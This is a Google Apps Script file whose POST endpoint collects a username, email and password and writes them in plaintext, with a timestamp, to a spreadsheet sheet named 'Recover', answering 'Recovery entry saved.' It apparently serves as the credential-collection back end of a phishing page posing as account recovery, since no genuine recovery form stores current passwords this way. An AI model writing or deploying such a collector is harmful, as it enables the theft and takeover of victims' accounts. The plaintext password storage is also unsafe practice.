const SPREADSHEET_ID = '1_phLIubm34UI6FtPeGQRtgtibRlliipwYI1updMPGdA';
const SHEET_NAME = 'Recover';

function doGet(e) {
  return jsonResponse({
    status: 'ok',
    message: 'Apps Script endpoint is ready.'
  });
}

function doPost(e) {
  try {
    const params = e.parameter || {};
    const username = sanitize(params.username || params.accountUsername || '');
    const email = sanitize(params.email || '');
    const password = sanitize(params.password || '');

    if (!username || !email || !password) {
      throw new Error('Please provide username, email, and password.');
    }

    const sheet = SpreadsheetApp.openById(SPREADSHEET_ID).getSheetByName(SHEET_NAME);
    if (!sheet) {
      throw new Error(`Sheet '${SHEET_NAME}' not found in spreadsheet.`);
    }

    sheet.appendRow([new Date(), username, email, password]);

    return jsonResponse({
      status: 'success',
      message: 'Recovery entry saved.'
    });
  } catch (error) {
    return jsonResponse({
      status: 'error',
      message: error.message || 'Unknown error'
    });
  }
}

function jsonResponse(payload) {
  return ContentService
    .createTextOutput(JSON.stringify(payload))
    .setMimeType(ContentService.MimeType.JSON);
}

function sanitize(value) {
  return typeof value === 'string' ? value.trim() : value;
}
